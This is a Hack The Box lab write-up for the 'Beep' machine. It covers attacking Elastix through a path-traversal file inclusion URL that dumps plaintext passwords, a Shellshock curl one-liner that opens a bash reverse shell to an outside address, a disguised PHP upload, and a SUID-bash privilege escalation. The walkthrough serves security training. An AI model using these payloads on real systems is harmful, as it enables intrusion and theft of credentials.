---
title: "HTB: Beep"
tags: [htb, linux, easy, elastix, sip, shellshock]

description: "Exploiting Elastix VoIP software. A box with 6 different entry points including LFI, Shellshock, and weak passwords."
---

# Hack The Box: Beep

**Machine IP**: `10.10.10.7`
**OS**: Linux (CentOS)
**Difficulty**: Easy

Beep is famous for having nearly a dozen ways to own it. It runs **Elastix**, a unified communications server (PBX) that bundles web mail, IM, and VoIP. It is a museum of vulnerabilities.

---

## 1. Reconnaissance

```bash
nmap -p- -sV 10.10.10.7
```
The output is massive:
*   **22 (SSH)**
*   **25 (SMTP)**
*   **80/443 (HTTP/HTTPS)**: Elastix Web Interface
*   **110/995 (POP3)**: Cyrus pop3d
*   **3306 (MySQL)**
*   **10000 (Webmin)**: MiniServ 1.570

---

## 2. Exploitation (Choose Your Adventure)

### Method A: LFI (Local File Inclusion)
The `/vtigercrm/` endpoint is vulnerable to LFI.
URL: `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../etc/amportal.conf%00&module=Accounts&action=Import`

This dumps the configuration file `amportal.conf`, which contains the admin passwords in plain text.
```text
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
```
This password (`jEhdIekWmdjE`) works for **root SSH**! Game over in 2 minutes.

### Method B: Shellshock
The web server CGI scripts are vulnerable to Shellshock (CVE-2014-6271).
```bash
curl -k -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.14/4444 0>&1" https://10.10.10.7/cgi-bin/test.cgi
```
This spawns a reverse shell as `asterisk`.

### Method C: FreePBX Upload
The FreePBX admin interface (accessible if you guess/crack `admin/admin`) allows uploading audio files for "Hold Music." You can upload a PHP shell masquerading as a `.wav` file, but you need to bypass strict naming checks.

---

## 3. Privilege Escalation

If you used Method B (Shellshock), you are the user `asterisk`.
Checking sudo:
```bash
sudo -l
```
```text
User asterisk may run the following commands on beep:
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/chmod
    ...
```

It allows `nmap` as root (older versions have interactive mode) and `chmod` as root.
We can simply `sudo chmod u+s /bin/bash` to make bash SUID root, then run `bash -p`.

## Conclusion
Beep is a reminder that "Unified" platforms often mean "Unified Vulnerabilities." Hardcoding passwords in readable config files (`amportal.conf`) is a critical failure.
